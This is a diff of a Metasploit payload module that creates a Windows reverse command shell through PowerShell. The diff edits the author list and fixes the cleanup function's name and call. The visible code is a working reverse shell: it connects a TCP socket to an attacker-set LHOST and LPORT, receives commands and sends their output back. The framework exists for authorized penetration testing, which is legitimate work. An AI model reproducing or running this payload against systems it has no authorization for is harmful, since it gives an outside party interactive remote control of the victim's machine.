@@ -17,7 +17,7 @@ module Metasploit3
     super(merge_info(info,
       'Name'          => 'Windows Command Shell, Reverse TCP (via Powershell)',
       'Description'   => 'Connect back and create a command shell via Powershell',
-      'Author'        => 'Ben Campbell', #and Anon author of http://pastebin.com/dPPuTDKY
+      'Author'        => ['Ben Campbell', 'Dave Kennedy'],
       'License'       => MSF_LICENSE,
       'Platform'      => 'win',
       'Arch'          => ARCH_CMD,
@@ -47,8 +47,10 @@ module Metasploit3
     lhost = datastore['LHOST']
     lport = datastore['LPORT']
     powershell = "function RSC{"\
-        "if ($c.Connected -eq $true) {$c.Close()};"\
-        "if ($p.ExitCode -ne $null) {$p.Close()};exit;};"\
+          "if ($c.Connected -eq $true) {$c.Close()};"\
+          "if ($p.ExitCode -ne $null) {$p.Close()};"\
+          "exit;"\
+        "};"\
         "$a='#{lhost}';$p='#{lport}';$c=New-Object system.net.sockets.tcpclient;"\
         "$c.connect($a,$p);$s=$c.GetStream();"\
         "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"\
@@ -62,7 +64,7 @@ module Metasploit3
         "$s.Write($e.GetBytes($o),0,$o.Length);"\
         "$o=$null;$d=$false;$t=0;"\
         "while (-not $d) {"\
-          "if ($c.Connected -ne $true) {cleanup};"\
+          "if ($c.Connected -ne $true) {RSC};"\
           "$pos=0;$i=1; "\
           "while (($i -gt 0) -and ($pos -lt $nb.Length)) {"\
             "$r=$s.Read($nb,$pos,$nb.Length - $pos);"\
